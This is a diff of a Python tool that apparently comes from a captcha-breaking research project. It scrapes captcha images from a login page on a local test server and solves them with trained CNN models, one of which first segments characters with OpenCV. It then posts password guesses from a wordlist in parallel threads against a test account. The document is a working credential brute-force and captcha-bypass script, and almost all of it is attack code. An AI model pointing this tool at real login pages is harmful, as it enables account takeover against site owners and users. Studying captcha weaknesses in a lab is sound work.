@@ -12,14 +12,21 @@ import threading
 import requests
 import time
 import sys
-from label import label_emnist, label_mnist
+from label import label_mnist
+from get_attacker_from_ckpt import get_attacker_from_ckpt_emnist, get_attacker_from_ckpt_python
 from dl_models import attacker_cnn_mnist
 from bs4 import BeautifulSoup
 from PIL import Image
 import numpy as np 
-from utils import convert_to_tfds
+from utils import convert_to_tfds, label_to_chr_emnist
+from feature_extractor import feature_extraction
 import matplotlib.pyplot as plt
 import tensorflow as tf
+import cv2
+from io import BytesIO
+from urllib.request import urlopen
+
+CAPTCHA_TYPE = 2
 
 class BruteForceCracker:
     def __init__(self, url, username, error_message_password, trained_model):
@@ -33,13 +40,32 @@ class BruteForceCracker:
             sys.stdout.flush()
             time.sleep(0.02)
 
-    def crack(self, password, num_iter=2):
+    def crack(self, password, num_iter=3):
         for i in range(num_iter) : 
             print("--------- {} captcha try -------------".format(i+1))
             current_captcha = retrieve_captcha_images(self.url, number_iter=1)
-            tfds_captcha = convert_to_tfds(current_captcha)
-            preds = tf.argmax(tf.nn.softmax(self.trained_model.predict(tfds_captcha), axis=-1), axis=-1)
-            preds_numpy = preds.numpy()  
+            if CAPTCHA_TYPE == 0 : 
+                tfds_captcha = convert_to_tfds(current_captcha)
+                preds = tf.argmax(tf.nn.softmax(self.trained_model.predict(tfds_captcha), axis=-1), axis=-1)  
+                preds_numpy = preds.numpy()  
+            if CAPTCHA_TYPE == 1 : 
+                tfds_captcha = convert_to_tfds(current_captcha)
+                preds = tf.argmax(tf.nn.softmax(self.trained_model.predict(tfds_captcha), axis=-1), axis=-1)
+                preds_numpy = label_to_chr_emnist(preds)
+            if CAPTCHA_TYPE == 2 : 
+                characters = feature_extraction(current_captcha[0])
+                if len(characters)<4 : 
+                    return 0
+                images = []
+                for index, character in enumerate(characters) : 
+                    if character.size == 0 : 
+                        return 0
+                    resized_image = cv2.resize(character, (28, 28), interpolation=cv2.INTER_AREA)
+                    pixels = np.array(resized_image).reshape(28, 28, 1)
+                    images.append(pixels)
+                tfds_captcha = convert_to_tfds(images)
+                preds = tf.argmax(tf.nn.softmax(self.trained_model.predict(tfds_captcha), axis=-1), axis=-1)
+                preds_numpy = label_to_chr_emnist(preds)
             preds_string = ''.join([str(idx) for idx in preds_numpy])
             data_dict = {"email": self.username, "password": password, "captcha_input": preds_string}
             response = requests.post(self.url, data=data_dict)
@@ -59,57 +85,73 @@ def crack_passwords(passwords, cracker):
         if cracker.crack(password):
             return
     print("No Password Found !")
+
 def retrieve_captcha_images(url, number_iter=300) : 
     img_url = []
     for _ in range(number_iter) : 
-        response = requests.get(url)
+        response = requests.get(url, allow_redirects=True)
         if response.status_code == 200:
             soup = BeautifulSoup(response.content, 'html.parser')
             div_tag = soup.find('div', id='randomImages')
             if div_tag:
-                #je récupère ici juste le champ src de la balise (ie l'url de l'image)
                 imgs = div_tag.find_all('img')
-                #je stocke dans une liste d'url
                 for img in imgs : 
                     img_url.append(img.get("src"))
             else:
                 print("Div tag not found.")
             
         else:
-            print("Failed to retrieve data. Status code:", response.status_code)
-    #je parcours la liste d'url, et je récupère l'image que je mets quelque part 
+            print("Failed to retrieve data. Status code : ", response.status_code)
     stock_image = []
+    print(img_url)
     for i in range (len(img_url)):
-        img_url[i] = "http://localhost:3006"+img_url[i]
+        img_url[i] = "http://localhost:3006" + img_url[i]
         response = requests.get(img_url[i], stream = True)
-        if response.status_code ==200:
+        if response.status_code == 200:
             image = Image.open(response.raw)
-            pixels = np.array(list(image.getdata())).reshape(28, 28, 1)
+            if CAPTCHA_TYPE != 2 :
+                pixels = np.array(list(image.getdata())).reshape(28, 28, 1)
+            else : 
+                req = urlopen(img_url[i])
+                arr = np.asarray(bytearray(req.read()), dtype=np.uint8)
+                pixels = cv2.imdecode(arr, -1)
+                cv2.imwrite("captcha.jpeg", pixels)
+                pixels = cv2.imread("captcha.jpeg")
             stock_image.append(pixels)
-
         else : 
             print("error response")
     return stock_image
 
 
-def main():
-    url = "http://localhost:3006/auth/login"
+def main(): 
+
     error = "Password incorrect! Please try again."
     username="test@test.test"
 
-    ###################### Captcha ##########################
-    print("Retrieving the captcha image")
-    captcha_images = retrieve_captcha_images("http://localhost:3006/auth/login", number_iter=300)
-    print()
-    tfds_captcha_images = convert_to_tfds(captcha_images)
-    predictions = label_mnist(tfds_captcha_images)
-    attacker_dataset = convert_to_tfds(captcha_images, predictions)
-    attacker_model = attacker_cnn_mnist.create_model()
-    trained_model = attacker_cnn_mnist.train(attacker_model, attacker_dataset, epochs=5)
-    #########################################################
+    if CAPTCHA_TYPE == 0 :
+        url = "http://localhost:3006/auth/login"
+        ###################### MNIST Captcha #########################
+        captcha_images = retrieve_captcha_images("http://localhost:3006/auth/login", number_iter=300)
+        tfds_captcha_images = convert_to_tfds(captcha_images)
+        predictions = label_mnist(tfds_captcha_images)
+        attacker_dataset = convert_to_tfds(captcha_images, predictions)
+        attacker_model = attacker_cnn_mnist.create_model()
+        trained_model = attacker_cnn_mnist.train(attacker_model, attacker_dataset, epochs=5)
+        cracker = BruteForceCracker(url, username, error, trained_model)
+        ###############################################################
+    elif CAPTCHA_TYPE == 1 : 
+        url = "http://localhost:3006/auth/login?captchaType=EMNIST"
+        ###################### EMNIST Captcha #########################
+        emnist_model = get_attacker_from_ckpt_emnist()
+        cracker = BruteForceCracker(url, username, error, emnist_model)
+        ###############################################################
+    else : 
+        url = "http://localhost:3006/auth/generateCaptcha"
+        ###################### Python Captcha #########################
+        python_model = get_attacker_from_ckpt_python()
+        cracker = BruteForceCracker(url, username, error, python_model)
+        ###############################################################
 
-    cracker = BruteForceCracker(url, username, error, trained_model)
-    
     with open("passwords.txt", "r") as f:
         chunk_size = 1000
         while True:
@@ -120,14 +162,12 @@ def main():
             t.start()
 
 if __name__ == '__main__':
-    try:
-        banner = """ 
-                    Checking the Server !!        
-    [+]█████████████████████████████████████████████████[+]
-    """
-        print(banner)
-        retrieve_captcha_images("http://localhost:3006/auth/login", 1)
-        main()
-    except :
-        print("An error occured during the execution of the script")
+    banner = """ 
+                Checking the Server !!        
+[+]█████████████████████████████████████████████████[+]
+"""
+    # print(banner)
+    #retrieve_captcha_images("http://localhost:3006/auth/login", 1)
+    #main()
+    retrieve_captcha_images("http://localhost:3006/auth/login?captchaType=Python", number_iter=3)
 
